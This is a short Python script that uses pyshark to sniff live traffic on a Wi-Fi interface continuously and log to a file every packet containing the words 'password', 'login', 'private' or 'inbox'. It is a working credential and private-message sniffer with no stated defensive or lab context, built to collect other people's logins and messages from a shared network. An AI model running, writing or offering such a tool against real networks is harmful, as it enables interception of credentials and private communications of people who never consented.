import pyshark

# Define the keywords to search for in the packets
keywords = ['password', 'login', 'private', 'inbox']

# Open a file for writing the captured data
file = open('wifi_monitor.txt', 'a')

# Define the function to capture and process packets
def capture_wifi():
    # Create a Wi-Fi capture object using pyshark
    cap = pyshark.LiveCapture(interface='wlan0')

    # Start capturing packets
    for packet in cap.sniff_continuously():
        # Extract the raw packet data as a string
        packet_data = str(packet)

        # Check if any of the keywords are in the packet data
        if any(keyword in packet_data.lower() for keyword in keywords):
            # Write the packet data to the file
            file.write(packet_data)

# Call the capture function
capture_wifi()
